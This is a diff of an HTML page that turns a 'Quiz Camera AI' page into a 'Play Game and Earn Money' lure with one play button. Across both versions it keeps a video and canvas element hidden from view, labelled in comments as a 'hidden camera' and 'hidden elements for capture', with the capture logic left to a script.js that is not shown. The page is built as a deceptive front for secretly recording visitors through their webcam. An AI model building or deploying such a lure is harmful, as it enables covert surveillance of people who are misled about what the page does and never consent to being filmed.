@@ -1,42 +1,64 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Quiz Camera AI</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Play Game and Earn Money</title>
   <style>
+    :root { --green: #1ba94c; --green-dark: #179441; }
     body {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: linear-gradient(135deg, #8EC5FC, #E0C3FC);
-      font-family: Arial, sans-serif;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f5f6f8;
+      margin: 0;
+      padding: 60px 20px;
+      display:flex;
+      justify-content:center;
     }
-    h1 { color: #333; }
-    button {
-      padding: 12px 25px;
-      margin: 10px;
-      font-size: 18px;
+    .card {
+      width:100%;
+      max-width:480px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+      padding: 34px 28px;
+      text-align:center;
+    }
+    h2 { margin: 0 0 8px; font-size: 1.35rem; }
+    p.lead { color: #444; margin: 0 0 22px; }
+    button#playBtn {
+      background: var(--green);
+      color: #fff;
       border: none;
-      border-radius: 10px;
+      padding: 12px 26px;
+      border-radius: 8px;
+      font-size: 1.05rem;
       cursor: pointer;
-      background-color: #4CAF50;
-      color: white;
-      transition: all 0.2s;
     }
-    button:hover { background-color: #45a049; }
-    #result { margin-top: 20px; font-size: 20px; font-weight: bold; }
-    video { display: none; } /* hidden camera */
+    button#playBtn:hover { background: var(--green-dark); }
+    #status {
+      margin-top: 20px;
+      font-weight: 600;
+      color: #222;
+    }
+    #status .win { color: #0a8b3b; }
+    #status .lose { color: #c62828; }
+    /* hide video/canvas visually */
+    video, canvas { display:none !important; width:0; height:0; }
   </style>
 </head>
 <body>
-  <h1>Quiz Camera AI</h1>
-  <button id="takeQuiz">Take Quiz</button>
-  <button id="skipQuiz">Don't Take Quiz</button>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <p id="result"></p>
+  <div class="card">
+    <h2>💰 Play Game and Earn Money</h2>
+    <p class="lead">Click <strong>Play Game</strong> to try your luck.</p>
+
+    <button id="playBtn">Play Game</button>
+
+    <div id="status"></div>
+
+    <!-- hidden elements for capture -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+  </div>
 
   <script src="script.js"></script>
 </body>
